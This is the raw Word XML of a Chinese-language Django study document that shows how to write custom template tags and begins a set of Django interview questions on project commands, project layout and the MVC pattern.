      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>首先你要在你的app目录下新建一个叫templatetags的文件夹(不能取其它名字), 里面必需包含__init__.py的空文件。在该目录下你还要新建一个python文件专门存放你自定义的模板标签函数，本例中为blog_extras.py，当然你也可以取其它名字。整个目录结构如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675FB355"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blog/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D6FA403"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__init__.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF3E2A8"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models.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4AF929"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templatetags/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1045613B"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__init__.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50AFC4E9"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blog_extras.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02220C7E" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
        <w:t xml:space="preserve">   views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F45FC30" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在模板中使用自定义的模板标签时，需要先使用{% load blog_extras %}载入自定义的过滤器，然后通过{% tag_name %} 使用它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE8A30A" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>举例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C3B33C" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们将定义3个简单模板标签，一个返回string, 一个给模板context传递变量，一个显示渲染过的模板。我们在blog_extra.py里添加下面代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C007B2" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#blog_extra.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F41E17"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lastRenderedPageBreak/>
        <w:t>from django import template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28333DCF"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import datetime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D705CA"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from blog.models import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6405FD2F" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54CED601"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register = template.Library()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF4CDB7" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5384A7CB"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use simple tag to show string</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2325E712"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@register.simple_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001E6C98"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def total_articles():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A38A889"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return Article.objects.filter(status='p').count()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA654C7" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A0F49AF"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use simple tag to set context variable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778A8DEC"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@register.simple_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19737E4A"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def get_first_article():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC0918E"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return Article.objects.filter(status='p').order_by('-pub_date')[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9CE906" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AA46F82"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show rendered template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4156B062"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@register.inclusion_tag('blog/latest_article_list.html')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B9777E"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def show_latest_articles(count=5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2729F916" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
        <w:t xml:space="preserve">    latest_articles = Article.objects.filter(status='p').order_by('-pub_date')[:count]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10459271" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {'latest_articles': latest_articles, }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F37279" w14:textId="40678931" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="500" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:noProof/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="29400AC4" wp14:editId="256896E4">
            <wp:extent cx="9525" cy="952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57133E">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="222226"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>Django框架基础知识（面试题）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF52581" w14:textId="2B98BAF1" w:rsidR="001C47AF"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195" w:name="1748-1535456506091"/>
      <w:bookmarkStart w:id="196" w:name="2650-1535456989211"/>
      <w:bookmarkStart w:id="197" w:name="6043-1535451888200"/>
      <w:bookmarkEnd w:id="195"/>
      <w:bookmarkEnd w:id="196"/>
      <w:bookmarkEnd w:id="197"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>001</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w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>创建项目的命令</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70ACC8C3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="198" w:name="4041-1535451898483"/>
      <w:bookmarkEnd w:id="198"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>django-admin startproject 项目名称</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F9EC745" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="199" w:name="3127-1535451909276"/>
      <w:bookmarkEnd w:id="199"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>python manage.py startapp 应用app名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794F613A" w14:textId="1BE01202" w:rsidR="001C47AF"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200" w:name="1936-1535451950246"/>
      <w:bookmarkStart w:id="201" w:name="5055-1535451951270"/>
      <w:bookmarkEnd w:id="200"/>
      <w:bookmarkEnd w:id="201"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>002</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w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>创建项目后，项目文件夹下的组成部分</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7551F2FD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="202" w:name="5580-1535451965388"/>
      <w:bookmarkEnd w:id="202"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>此题考的是学员对MVT 的理解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E3DD1A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="203" w:name="1470-1535452010126"/>
      <w:bookmarkEnd w:id="203"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>项目文件夹下的组成部分：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A61EC3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="204" w:name="8864-1535452010518"/>
      <w:bookmarkEnd w:id="204"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>manage.py 是项目运行的入口，指定配置文件路径。与项目同名的目录，包含项目的配置文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AF70364" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="205" w:name="4082-1535452010518"/>
      <w:bookmarkEnd w:id="205"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>  init.py 是一个空文件，作用是这个目录可以被当作包使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714A0A63" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="206" w:name="9041-1535452010518"/>
      <w:bookmarkEnd w:id="206"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>settings.py 是项目的整体配置文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407D69EE" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="207" w:name="3423-1535452010518"/>
      <w:bookmarkEnd w:id="207"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>urls.py 是项目的URL配置文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2655B3F1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="208" w:name="8018-1535452044923"/>
      <w:bookmarkEnd w:id="208"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>wsgi.py 是项目与 WSGI 兼容的 Web 服务器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E4EE48" w14:textId="4A3DB0F9" w:rsidR="001C47AF"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209" w:name="3582-1535452027659"/>
      <w:bookmarkStart w:id="210" w:name="5790-1535452024108"/>
      <w:bookmarkEnd w:id="209"/>
      <w:bookmarkEnd w:id="210"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>003</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对</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> MVC,MVT </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>解读的理解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29960FCF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="211" w:name="1299-1535452205026"/>
      <w:bookmarkEnd w:id="211"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MVC:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE92EE5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="212" w:name="6380-1535452065203"/>
      <w:bookmarkEnd w:id="212"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>M：Model，模型，和数据库进行交互</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B8F7F6" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="213" w:name="7464-1535452065561"/>
      <w:bookmarkEnd w:id="213"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>V：View，视图，负责产生 Html 页面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0D5A15" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="214" w:name="3958-1535452065561"/>
      <w:bookmarkEnd w:id="214"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>C：Controller，控制器，接收请求，进行处理，与 M 和 V 进行交互，返回应答。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A459692" w14:textId="2210D7EB" w:rsidR="001C47AF" w:rsidRDefault="001C47AF" w:rsidP="001C47AF">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="27E534B2" wp14:editId="586EB22A">
            <wp:extent cx="6733540" cy="30099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741200" cy="3013324"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AAE28B1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="215" w:name="0010-1535452068043"/>
      <w:bookmarkEnd w:id="215"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1） 用户点击注按钮，将要注册的信息发送给网站服务器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065BFD59" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="216" w:name="5349-1535452116467"/>
      <w:bookmarkEnd w:id="216"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）Controller 控制器接收到用户的注册信息，Controller 会告诉 Model 层将用户的注册信息保存到数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1212FA4E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="217" w:name="8668-1535452116467"/>
      <w:bookmarkEnd w:id="217"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）Model 层将用户的注册信息保存到数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1933EF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="218" w:name="7671-1535452116467"/>
      <w:bookmarkEnd w:id="218"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（4） 数据保存之后将保存的结果返回给 Model 模型，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEA6178" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="0057133E" w:rsidRDefault="001C47AF" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="219" w:name="8746-1535452116467"/>
      <w:bookmarkEnd w:id="219"/>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（5）Model 层将保存的结果返回给 Controller 控制器。</w:t>
      </w:r>
    </w:p>
